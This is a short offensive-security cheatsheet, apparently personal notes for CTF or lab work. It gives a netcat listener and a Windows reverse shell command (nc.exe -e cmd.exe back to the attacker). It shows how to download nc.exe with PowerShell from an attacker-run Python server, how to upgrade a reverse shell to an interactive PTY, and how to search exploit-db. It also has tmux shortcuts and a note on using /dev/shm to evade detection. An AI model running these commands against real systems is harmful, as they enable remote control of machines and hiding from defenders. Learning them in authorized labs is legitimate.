# Cheatsheet

Listen locally with nc
```
nc -lvnp 4444
```

Remote (Windows):
```
nc.exe -e cmd.exe <local ip> 4444
```

Python web server and download with PS

```
python3 -m http.server 80
powershell Invoke-Webrequest -OutFile C:\temp\nc.exe -Uri http://10.10.14.116/nc.exe"
```

## Interactive terminal

Using Python for a psuedo terminal

```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

# Exploits
```bash
# local exploit-db
searchsploit "service name"
# show code of exploit
searchsplot -x <path number>
```

# Tools
https://github.com/infodox/python-pty-shells

## tmux
```bash
# new session
tmux new -s <name>
# list
tmux ls
# attach
tmux attach -t <name>

## tmux options
run-shell /opt/tmux-logging/logging.tmux
```
prefix key: ctrl+b
|Purpose|Prefix|
|-|-|
|c|new tab|
|[0-9]|go to tab n|
|d|detach|
|%|vertical split|
|"|horizontal split|
|arrow keys|move to pane|
|z|toggle zoom into pane|
|$|rename session|
|,|rename tab|
|space|cycle looks|
|t|show time|



# Detection evasion
## Linux
`/dev/shm` is a ramdisk -> not saved for ever
